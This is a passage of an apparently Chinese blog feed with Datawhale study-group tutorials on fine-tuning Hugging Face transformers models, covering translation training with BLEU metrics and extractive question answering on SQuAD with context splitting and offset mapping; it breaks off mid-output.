class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">batch_size = <span class="hljs-number">16</span><br>args = Seq2SeqTrainingArguments(<br>    <span class="hljs-string">&quot;test-translation&quot;</span>,<br>    evaluation_strategy = <span class="hljs-string">&quot;epoch&quot;</span>,<br>    learning_rate=<span class="hljs-number">2e-5</span>,<br>    per_device_train_batch_size=batch_size,<br>    per_device_eval_batch_size=batch_size,<br>    weight_decay=<span class="hljs-number">0.01</span>,<br>    save_total_limit=<span class="hljs-number">3</span>,<br>    num_train_epochs=<span class="hljs-number">1</span>,<br>    predict_with_generate=<span class="hljs-literal">True</span>,<br>    fp16=<span class="hljs-literal">False</span>,<br>)<br></code></pre></td></tr></table></figure><p>数据收集器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">data_collator = DataCollatorForSeq2Seq(tokenizer, model=model)<br></code></pre></td></tr></table></figure><p>数据后处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">postprocess_text</span>(<span class="hljs-params">preds, labels</span>):<br>    preds = [pred.strip() <span class="hljs-keyword">for</span> pred <span class="hljs-keyword">in</span> preds]<br>    labels = [[label.strip()] <span class="hljs-keyword">for</span> label <span class="hljs-keyword">in</span> labels]<br><br>    <span class="hljs-keyword">return</span> preds, labels<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compute_metrics</span>(<span class="hljs-params">eval_preds</span>):<br>    preds, labels = eval_preds<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(preds, <span class="hljs-built_in">tuple</span>):<br>        preds = preds[<span class="hljs-number">0</span>]<br>    decoded_preds = tokenizer.batch_decode(preds, skip_special_tokens=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment"># Replace -100 in the labels as we can&#x27;t decode them.</span><br>    labels = np.where(labels != -<span class="hljs-number">100</span>, labels, tokenizer.pad_token_id)<br>    decoded_labels = tokenizer.batch_decode(labels, skip_special_tokens=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment"># Some simple post-processing</span><br>    decoded_preds, decoded_labels = postprocess_text(decoded_preds, decoded_labels)<br><br>    result = metric.compute(predictions=decoded_preds, references=decoded_labels)<br>    result = &#123;<span class="hljs-string">&quot;bleu&quot;</span>: result[<span class="hljs-string">&quot;score&quot;</span>]&#125;<br><br>    prediction_lens = [np.count_nonzero(pred != tokenizer.pad_token_id) <span class="hljs-keyword">for</span> pred <span class="hljs-keyword">in</span> preds]<br>    result[<span class="hljs-string">&quot;gen_len&quot;</span>] = np.mean(prediction_lens)<br>    result = &#123;k: <span class="hljs-built_in">round</span>(v, <span class="hljs-number">4</span>) <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> result.items()&#125;<br>    <span class="hljs-keyword">return</span> result<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">trainer = Seq2SeqTrainer(<br>    model,<br>    args,<br>    train_dataset=tokenized_datasets[<span class="hljs-string">&quot;train&quot;</span>],<br>    eval_dataset=tokenized_datasets[<span class="hljs-string">&quot;validation&quot;</span>],<br>    data_collator=data_collator,<br>    tokenizer=tokenizer,<br>    compute_metrics=compute_metrics<br>)<br><br><span class="hljs-comment">#  开始训练</span><br>trainer.train()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
      <category>自然语言处理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Datawhale组队学习</tag>
      
      <tag>NLP入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于Transformers的自然语言处理(NLP)入门(五)</title>
    <link href="/2021/09/28/nlp-transformer/nlp-transformer-5/"/>
    <url>/2021/09/28/nlp-transformer/nlp-transformer-5/</url>
    
    <content type="html"><![CDATA[<p>本文为参加Datawhale组队学习时所写，如若需了解细致内容，请去到Datawhale官方开源课程<ahref="https://datawhalechina.github.io/learn-nlp-with-transformers/#/">基于transformers的自然语言处理(NLP)入门(datawhalechina.github.io)</a></p><h1 id="抽取式问答任务">抽取式问答任务</h1><p>抽取式问答任务：给定一个问题和一段文本，从这段文本中找出能够回答该问题的文本片段(span),通过使用TranierAPI和dataset包，我们可以轻松加载数据，然后微调transformers。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># squad_v2等于True或者False分别代表使用SQUAD v1 或者 SQUAD v2。</span><br><span class="hljs-comment"># 如果您使用的是其他数据集，那么True代表的是：模型可以回答“不可回答”问题，也就是部分问题不给出答案，而False则代表所有问题必须回答。</span><br>squad_v2 = <span class="hljs-literal">False</span><br>model_checkpoint = <span class="hljs-string">&quot;distilbert-base-uncased&quot;</span><br>batch_size = <span class="hljs-number">16</span><br></code></pre></td></tr></table></figure><h2 id="加载数据集">加载数据集</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datasets <span class="hljs-keyword">import</span> load_datasets, load_metric<br><br><br><span class="hljs-comment">#  下载数据</span><br>datasets = load_dataset(<span class="hljs-string">&quot;squad_v2&quot;</span> <span class="hljs-keyword">if</span> squad_v2 <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;squad&quot;</span>)<br></code></pre></td></tr></table></figure><span id="more"></span><p>datasets的属性结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">DatasetDict(&#123;<br>    train: Dataset(&#123;<br>        features: [<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-string">&#x27;title&#x27;</span>, <span class="hljs-string">&#x27;context&#x27;</span>, <span class="hljs-string">&#x27;question&#x27;</span>, <span class="hljs-string">&#x27;answers&#x27;</span>],<br>        num_rows: <span class="hljs-number">87599</span><br>    &#125;)<br>    validation: Dataset(&#123;<br>        features: [<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-string">&#x27;title&#x27;</span>, <span class="hljs-string">&#x27;context&#x27;</span>, <span class="hljs-string">&#x27;question&#x27;</span>, <span class="hljs-string">&#x27;answers&#x27;</span>],<br>        num_rows: <span class="hljs-number">10570</span><br>    &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>无论是训练集、验证集还是测试集，对于每一个问答数据样本都会有“context","question"和“answers”三个key。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">datasets[<span class="hljs-string">&quot;train&quot;</span>][<span class="hljs-number">0</span>]<br><span class="hljs-comment"># answers代表答案</span><br><span class="hljs-comment"># context代表文本片段</span><br><span class="hljs-comment"># question代表问题</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-string">&#x27;answers&#x27;</span>: &#123;<span class="hljs-string">&#x27;answer_start&#x27;</span>: [<span class="hljs-number">515</span>], <span class="hljs-string">&#x27;text&#x27;</span>: [<span class="hljs-string">&#x27;Saint Bernadette Soubirous&#x27;</span>]&#125;,<br> <span class="hljs-string">&#x27;context&#x27;</span>: <span class="hljs-string">&#x27;Architecturally, the school has a Catholic character. Atop the Main Building\&#x27;s gold dome is a golden statue of the Virgin Mary. Immediately in front of the Main Building and facing it, is a copper statue of Christ with arms upraised with the legend &quot;Venite Ad Me Omnes&quot;. Next to the Main Building is the Basilica of the Sacred Heart. Immediately behind the basilica is the Grotto, a Marian place of prayer and reflection. It is a replica of the grotto at Lourdes, France where the Virgin Mary reputedly appeared to Saint Bernadette Soubirous in 1858. At the end of the main drive (and in a direct line that connects through 3 statues and the Gold Dome), is a simple, modern stone statue of Mary.&#x27;</span>,<br> <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;5733be284776f41900661182&#x27;</span>,<br> <span class="hljs-string">&#x27;question&#x27;</span>: <span class="hljs-string">&#x27;To whom did the Virgin Mary allegedly appear in 1858 in Lourdes France?&#x27;</span>,<br> <span class="hljs-string">&#x27;title&#x27;</span>: <span class="hljs-string">&#x27;University_of_Notre_Dame&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>answers除了给出了文本片段里的答案文本之外，还给出了该answer所在位置（以character开始计算，上面的例子是第515位）。</p><p>随机抽取数据，进行展示。</p><img src="/2021/09/28/nlp-transformer/nlp-transformer-5/image-20210928150458790.png" class="" title="data"><h2 id="数据预处理">数据预处理</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoTokenizer<br>    <br>tokenizer = AutoTokenizer.from_pretrained(model_checkpoint)<br><br><span class="hljs-keyword">import</span> transformers<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">isinstance</span>(tokenizer, transformers.PreTrainedTokenizerFast)<br></code></pre></td></tr></table></figure><p>现在我们还需要思考预训练机器问答模型们是如何处理非常长的文本的。一般来说预训练模型输入有最大长度要求，所以我们通常将超长的输入进行截断。但是，如果我们将问答数据三元组&lt;question,context,answer&gt;中的超长context截断，那么我们可能丢掉答案（因为我们是从context中抽取出一个小片段作为答案）。</p><p>为了解决这个问题，下面的代码找到一个超过长度的例子，然后向您演示如何进行处理。我们把超长的输入切片为多个较短的输入，每个输入都要满足模型最大长度输入要求。由于答案可能存在与切片的地方，因此我们需要允许相邻切片之间有交集，代码中通过<code>doc_stride</code>参数控制。</p><p>机器问答预训练模型通常将question和context拼接之后作为输入，然后让模型从context里寻找答案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">max_length = <span class="hljs-number">384</span>  <span class="hljs-comment"># 输入feature的最大长度，question和context拼接之后</span><br>doc_stride = <span class="hljs-number">128</span>  <span class="hljs-comment"># 2个切片之间的重合token数量。</span><br></code></pre></td></tr></table></figure><p>for循环遍历数据集，寻找一个超长样本，本notebook例子模型所要求的最大输入是384（经常使用的还有512）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i, example <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(datasets[<span class="hljs-string">&quot;train&quot;</span>]):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tokenizer(example[<span class="hljs-string">&quot;question&quot;</span>], example[<span class="hljs-string">&quot;context&quot;</span>])[<span class="hljs-string">&quot;input_ids&quot;</span>]) &gt; <span class="hljs-number">384</span>:<br>        <span class="hljs-keyword">break</span><br>example = datasets[<span class="hljs-string">&quot;train&quot;</span>][i]<br></code></pre></td></tr></table></figure><p>如果不截断的话，那么输入的长度是396</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">len</span>(tokenizer(example[<span class="hljs-string">&quot;question&quot;</span>], example[<span class="hljs-string">&quot;context&quot;</span>])[<span class="hljs-string">&quot;input_ids&quot;</span>])<br><span class="hljs-number">396</span><br></code></pre></td></tr></table></figure><p>现在如果我们截断成最大长度384，将会丢失超长部分的信息</p><p>注意，一般来说，我们只对context进行切片，不会对问题进行切片，由于context是拼接在question后面的，对应着第2个文本，所以使用<code>only_second</code>控制.tokenizer使用<code>doc_stride</code>控制切片之间的重合长度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">tokenized_example = tokenizer(<br>    example[<span class="hljs-string">&quot;question&quot;</span>],<br>    example[<span class="hljs-string">&quot;context&quot;</span>],<br>    max_length=max_length,<br>    truncation=<span class="hljs-string">&quot;only_second&quot;</span>,<br>    return_overflowing_tokens=<span class="hljs-literal">True</span>,<br>    stride=doc_stride<br>)<br></code></pre></td></tr></table></figure><p>由于对超长输入进行了切片，我们得到了多个输入，这些输入input_ids对应的长度是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-built_in">len</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> tokenized_example[<span class="hljs-string">&quot;input_ids&quot;</span>]]<br><br>[<span class="hljs-number">384</span>, <span class="hljs-number">157</span>]<br></code></pre></td></tr></table></figure><p>我们可以将预处理后的token IDs，input_ids还原为文本格式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i, x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(tokenized_example[<span class="hljs-string">&quot;input_ids&quot;</span>][:<span class="hljs-number">2</span>]):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;切片: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i))<br>    <span class="hljs-built_in">print</span>(tokenizer.decode(x))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">切片: <span class="hljs-number">0</span><br>[CLS] how many wins does the notre dame men<span class="hljs-string">&#x27;s basketball team have? [SEP] the men&#x27;</span>s basketball team has over <span class="hljs-number">1</span>, <span class="hljs-number">600</span> wins, one of only <span class="hljs-number">12</span> schools who have reached that ....<br>championship. the <span class="hljs-number">2010</span> – <span class="hljs-number">11</span> team concluded its regular season ranked number seven <span class="hljs-keyword">in</span> the country, <span class="hljs-keyword">with</span> a record of <span class="hljs-number">25</span> – <span class="hljs-number">5</span>, brey<span class="hljs-string">&#x27;s fifth straight 20 - win season, and a second - place finish in the big east. during the 2014 - 15 season, the team went 32 - 6 and won the acc conference tournament, later advancing to the elite 8, where the fighting irish lost on a missed buzzer - beater against then undefeated kentucky. led by nba draft picks jerian grant and pat connaughton, the fighting irish beat the eventual national champion duke blue devils twice during the season. the 32 wins were [SEP]</span><br><span class="hljs-string">切片: 1</span><br><span class="hljs-string">[CLS] how many wins does the notre dame men&#x27;</span>s basketball team have? [SEP] championship. the <span class="hljs-number">2010</span> – <span class="hljs-number">11</span> team concluded its regular season ranked number seven <span class="hljs-keyword">in</span> the country, <span class="hljs-keyword">with</span> a record of <span class="hljs-number">25</span> – <span class="hljs-number">5</span>, brey<span class="hljs-string">&#x27;s fifth straight 20 - win season, and a second - place finish in the big east. during the 2014 - 15 season, the team went 32 - 6 and won the acc conference tournament, later advancing to the elite 8, where the fighting irish lost on a missed buzzer - beater against then undefeated kentucky. led by nba draft picks jerian grant and pat connaughton, the fighting irish beat the eventual national champion duke blue devils twice during the season. the 32 wins were the most by the fighting irish team since 1908 - 09. [SEP]</span><br></code></pre></td></tr></table></figure><p>由于我们对超长文本进行了切片，我们需要重新寻找答案所在位置（相对于每一片context开头的相对位置）。机器问答模型将使用答案的位置（答案的起始位置和结束位置，start和end）作为训练标签（而不是答案的tokenIDS）。所以切片需要和原始输入有一个对应关系，每个token在切片后context的位置和原始超长context里位置的对应关系。在tokenizer里可以使用<code>return_offsets_mapping</code>参数得到这个对应关系的map：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">tokenized_example = tokenizer(<br>    example[<span class="hljs-string">&quot;question&quot;</span>],<br>    example[<span class="hljs-string">&quot;context&quot;</span>],<br>    max_length=max_length,<br>    truncation=<span class="hljs-string">&quot;only_second&quot;</span>,<br>    return_overflowing_tokens=<span class="hljs-literal">True</span>,<br>    return_offsets_mapping=<span class="hljs-literal">True</span>,<br>    stride=doc_stride<br>)<br><span class="hljs-comment"># 打印切片前后位置下标的对应关系</span><br><span class="hljs-built_in">print</span>(tokenized_example[<span class="hljs-string">&quot;offset_mapping&quot;</span>][<span class="hljs-number">0</span>][:<span class="hljs-number">100</span>])<br></code></pre></td></tr></table></figure><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[(<span class="hljs-name">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">3</span>), (<span class="hljs-name">4</span>, <span class="hljs-number">8</span>), (<span class="hljs-name">9</span>, <span class="hljs-number">13</span>), (<span class="hljs-name">14</span>, <span class="hljs-number">18</span>), (<span class="hljs-name">19</span>, <span class="hljs-number">22</span>), (<span class="hljs-name">23</span>, <span class="hljs-number">28</span>), (<span class="hljs-name">29</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">34</span>, <span class="hljs-number">37</span>), (<span class="hljs-name">37</span>, <span class="hljs-number">38</span>), (<span class="hljs-name">38</span>, <span class="hljs-number">39</span>), (<span class="hljs-name">40</span>, <span class="hljs-number">50</span>), (<span class="hljs-name">51</span>, <span class="hljs-number">55</span>), (<span class="hljs-name">56</span>, <span class="hljs-number">60</span>), (<span class="hljs-name">60</span>, <span class="hljs-number">61</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">3</span>), (<span class="hljs-name">4</span>, <span class="hljs-number">7</span>), (<span class="hljs-name">7</span>, <span class="hljs-number">8</span>), (<span class="hljs-name">8</span>, <span class="hljs-number">9</span>), (<span class="hljs-name">10</span>, <span class="hljs-number">20</span>), (<span class="hljs-name">21</span>, <span class="hljs-number">25</span>), (<span class="hljs-name">26</span>, <span class="hljs-number">29</span>), (<span class="hljs-name">30</span>, <span class="hljs-number">34</span>), (<span class="hljs-name">35</span>, <span class="hljs-number">36</span>), (<span class="hljs-name">36</span>, <span class="hljs-number">37</span>), (<span class="hljs-name">37</span>, <span class="hljs-number">40</span>), (<span class="hljs-name">41</span>, <span class="hljs-number">45</span>), (<span class="hljs-name">45</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">47</span>, <span class="hljs-number">50</span>), (<span class="hljs-name">51</span>, <span class="hljs-number">53</span>), (<span class="hljs-name">54</span>, <span class="hljs-number">58</span>), (<span class="hljs-name">59</span>, <span class="hljs-number">61</span>), (<span class="hljs-name">62</span>, <span class="hljs-number">69</span>), (<span class="hljs-name">70</span>, <span class="hljs-number">73</span>), (<span class="hljs-name">74</span>, <span class="hljs-number">78</span>), (<span class="hljs-name">79</span>, <span class="hljs-number">86</span>), (<span class="hljs-name">87</span>, <span class="hljs-number">91</span>), (<span class="hljs-name">92</span>, <span class="hljs-number">96</span>), (<span class="hljs-name">96</span>, <span class="hljs-number">97</span>), (<span class="hljs-name">98</span>, <span class="hljs-number">101</span>), (<span class="hljs-name">102</span>, <span class="hljs-number">106</span>), (<span class="hljs-name">107</span>, <span class="hljs-number">115</span>), (<span class="hljs-name">116</span>, <span class="hljs-number">118</span>), (<span class="hljs-name">119</span>, <span class="hljs-number">121</span>), (<span class="hljs-name">122</span>, <span class="hljs-number">126</span>), (<span class="hljs-name">127</span>, <span class="hljs-number">138</span>), (<span class="hljs-name">138</span>, <span class="hljs-number">139</span>), (<span class="hljs-name">140</span>, <span class="hljs-number">146</span>), (<span class="hljs-name">147</span>, <span class="hljs-number">153</span>), (<span class="hljs-name">154</span>, <span class="hljs-number">160</span>), (<span class="hljs-name">161</span>, <span class="hljs-number">165</span>), (<span class="hljs-name">166</span>, <span class="hljs-number">171</span>), (<span class="hljs-name">172</span>, <span class="hljs-number">175</span>), (<span class="hljs-name">176</span>, <span class="hljs-number">182</span>), (<span class="hljs-name">183</span>, <span class="hljs-number">186</span>), (<span class="hljs-name">187</span>, <span class="hljs-number">191</span>), (<span class="hljs-name">192</span>, <span class="hljs-number">198</span>), (<span class="hljs-name">199</span>, <span class="hljs-number">205</span>), (<span class="hljs-name">206</span>, <span class="hljs-number">208</span>), (<span class="hljs-name">209</span>, <span class="hljs-number">210</span>), (<span class="hljs-name">211</span>, <span class="hljs-number">217</span>), (<span class="hljs-name">218</span>, <span class="hljs-number">222</span>), (<span class="hljs-name">223</span>, <span class="hljs-number">225</span>), (<span class="hljs-name">226</span>, <span class="hljs-number">229</span>), (<span class="hljs-name">230</span>, <span class="hljs-number">240</span>), (<span class="hljs-name">241</span>, <span class="hljs-number">245</span>), (<span class="hljs-name">246</span>, <span class="hljs-number">248</span>), (<span class="hljs-name">248</span>, <span class="hljs-number">249</span>), (<span class="hljs-name">250</span>, <span class="hljs-number">258</span>), (<span class="hljs-name">259</span>, <span class="hljs-number">262</span>), (<span class="hljs-name">263</span>, <span class="hljs-number">267</span>), (<span class="hljs-name">268</span>, <span class="hljs-number">271</span>), (<span class="hljs-name">272</span>, <span class="hljs-number">277</span>), (<span class="hljs-name">278</span>, <span class="hljs-number">281</span>), (<span class="hljs-name">282</span>, <span class="hljs-number">285</span>), (<span class="hljs-name">286</span>, <span class="hljs-number">290</span>), (<span class="hljs-name">291</span>, <span class="hljs-number">301</span>), (<span class="hljs-name">301</span>, <span class="hljs-number">302</span>), (<span class="hljs-name">303</span>, <span class="hljs-number">307</span>), (<span class="hljs-name">308</span>, <span class="hljs-number">312</span>), (<span class="hljs-name">313</span>, <span class="hljs-number">318</span>), (<span class="hljs-name">319</span>, <span class="hljs-number">321</span>), (<span class="hljs-name">322</span>, <span class="hljs-number">325</span>), (<span class="hljs-name">326</span>, <span class="hljs-number">330</span>), (<span class="hljs-name">330</span>, <span class="hljs-number">331</span>), (<span class="hljs-name">332</span>, <span class="hljs-number">340</span>), (<span class="hljs-name">341</span>, <span class="hljs-number">351</span>), (<span class="hljs-name">352</span>, <span class="hljs-number">354</span>), (<span class="hljs-name">355</span>, <span class="hljs-number">363</span>), (<span class="hljs-name">364</span>, <span class="hljs-number">373</span>), (<span class="hljs-name">374</span>, <span class="hljs-number">379</span>), (<span class="hljs-name">379</span>, <span class="hljs-number">380</span>), (<span class="hljs-name">381</span>, <span class="hljs-number">384</span>), (<span class="hljs-name">385</span>, <span class="hljs-number">389</span>), (<span class="hljs-name">390</span>, <span class="hljs-number">393</span>), (<span class="hljs-name">394</span>, <span class="hljs-number">406</span>), (<span class="hljs-name">407</span>, <span class="hljs-number">408</span>), (<span class="hljs-name">409</span>, <span class="hljs-number">415</span>), (<span class="hljs-name">416</span>, <span class="hljs-number">418</span>)]<br>[<span class="hljs-name">0</span>, <span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>上面打印的是tokenized_example第0片的前100个tokens在原始context片里的位置。注意第一个token是<code>[CLS]</code>设定为(0,0)是因为这个token不属于qeustion或者answer的一部分。第2个token对应的起始和结束位置是0和3。我们可以根据切片后的tokenid转化对应的token；然后使用<code>offset_mapping</code>参数映射回切片前的token位置，找到原始位置的tokens。由于question拼接在context前面，所以直接从question里根据下标找就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">first_token_id = tokenized_example[<span class="hljs-string">&quot;input_ids&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]<br>offsets = tokenized_example[<span class="hljs-string">&quot;offset_mapping&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(tokenizer.convert_ids_to_tokens([first_token_id])[<span class="hljs-number">0</span>], example[<span class="hljs-string">&quot;question&quot;</span>][offsets[<span class="hljs-number">0</span>]:offsets[<span class="hljs-number">1</span>]])<br></code></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">how How</span><br></code></pre></td></tr></table></figure><p>因此，我们得到了切片前后的位置对应关系。我们还需要使用<code>sequence_ids</code>参数来区分question和context。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sequence_ids = tokenized_example.sequence_ids()<br></code></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">[<span class="hljs-built_in">None</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-built_in">None</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, 